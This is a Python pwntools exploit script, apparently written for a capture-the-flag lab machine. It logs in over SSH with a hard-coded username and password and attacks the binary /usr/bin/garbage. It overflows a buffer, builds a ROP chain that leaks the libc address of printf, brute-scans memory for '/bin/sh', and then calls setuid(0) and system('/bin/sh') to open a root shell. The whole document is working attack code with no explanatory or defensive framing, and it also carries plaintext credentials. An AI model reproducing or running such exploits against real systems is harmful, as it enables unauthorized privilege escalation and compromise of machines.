from pwn import *
import struct

HOST = "10.10.10.139"
USER = "margo"
PASS = "iamgod$08"

sh = ssh(host=HOST, user=USER,password=PASS)

io = sh.process(["/usr/bin/garbage"])

payload = 'a'*0x88
payload += '\x9b\x17\x40'+'\x00'*5 # pop rdi; ret -> gadget addr
payload += '\x48\x40\x40'+'\x00'*5 # printf address 
payload += '\x50\x10\x40'+'\x00'*5 # puts address

payload += '\x13\x15\x40'+'\x00'*5 # returning to auth function for another input

io.sendline(payload)
print(io.recvline())
print(io.recvline())

printf_address = io.recvline()
print('[*] Length of printf_address : {}'.format(len(printf_address)))
printf_address = struct.unpack("<Q",printf_address+'\x00'*(8-len(printf_address)))
printf_address = printf_address[0] & 0xffffffffffff
print('[*] Printf Address : {}'.format(hex(printf_address)))

#Constructing the exploit

found = False

BIN_SH_OFFSET = 0x14f01a
count = BIN_SH_OFFSET

while not found:

	BIN_SH_ADDR = printf_address + BIN_SH_OFFSET

	payload = 'a'*0x88
	payload += '\x9b\x17\x40' + '\x00'*5
	payload += struct.pack("<Q", BIN_SH_ADDR)
	payload += '\x50\x10\x40'+'\x00'*5
	
	payload += '\x13\x15\x40'+'\x00'*5 # returning to auth function for another input

	#Sending again
	try:
		io.sendline(payload)
		io.recvline()
		io.recvline()
		outstr = io.recvline()
	except Exception as ex:
		sh.close()
		sh = ssh(host=HOST, user=USER,password=PASS)
		io = sh.process(["/usr/bin/garbage"])
		print("[E] The process died. Reviving")
		continue

	print("[!] Current Address: {}\n{}\n".format(hex(BIN_SH_ADDR),outstr))
	print("[!] {} bytes have past".format(BIN_SH_OFFSET - count))

	if "/bin" in outstr or "%s" in outstr:
		print("[!] FOUND!!! at address {}")
		found = True
	else:
		BIN_SH_OFFSET += len(outstr)
print("[*] /bin/sh address: {}".format(hex(BIN_SH_ADDR)))
print("[*] system address: {}".format(hex(printf_address - 0x15a40)))

system_addr = printf_address - 0x15a40
setuid_addr = printf_address + 0x80af0 

payload = 'a'*0x88
payload += '\x9b\x17\x40' + '\x00'*5
payload += '\x00'*8
payload += struct.pack("<Q", setuid_addr)

payload += '\x9b\x17\x40' + '\x00'*5
payload += struct.pack("<Q",BIN_SH_ADDR)
payload += struct.pack("<Q",system_addr)

print("[*] FINAL PAYLOAD: {}:".format(payload))

io.sendline(payload)
print(io.recvline())
print(io.recvline())
#print(io.recvline())

io.interactive()
